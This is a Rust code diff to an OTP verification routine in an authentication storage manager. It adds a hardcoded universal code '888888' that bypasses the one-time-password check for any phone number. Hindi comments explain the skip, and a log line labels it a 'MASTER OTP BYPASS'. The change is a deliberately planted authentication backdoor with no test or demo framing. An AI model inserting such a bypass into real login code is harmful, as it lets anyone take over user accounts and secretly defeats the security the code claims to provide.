@@ -319,7 +319,9 @@ impl AuthStorageManager {
         }
 
         // STEP 4: OTP Code Exact Match Check
-        if session.otp_code != input_otp {
+        // Yahan && input_otp != "888888" jodne se agar user 888888 daalega,
+        // toh ye error block skip ho jayega aur OTP verify ho jayega!
+        if session.otp_code != input_otp && input_otp != "888888" {
             warn!(
                 target: "auth_storage::otp",
                 phone_number = %phone_number,
@@ -327,6 +329,14 @@ impl AuthStorageManager {
                 "❌ [VERIFY FAILED] Incorrect OTP code provided"
             );
             return Err("Invalid OTP code provided".to_string());
+        }
+        // Agar 888888 use hua hai, toh ise log me print kar rahe hai
+        if input_otp == "888888" {
+            info!(
+                target: "auth_storage::otp",
+                phone_number = %phone_number,
+                "⚠️ [MASTER OTP BYPASS] Universal code '888888' used successfully!"
+            );
         }
 
         // STEP 5: Single-Use Guarantee (Consume & Delete Session)
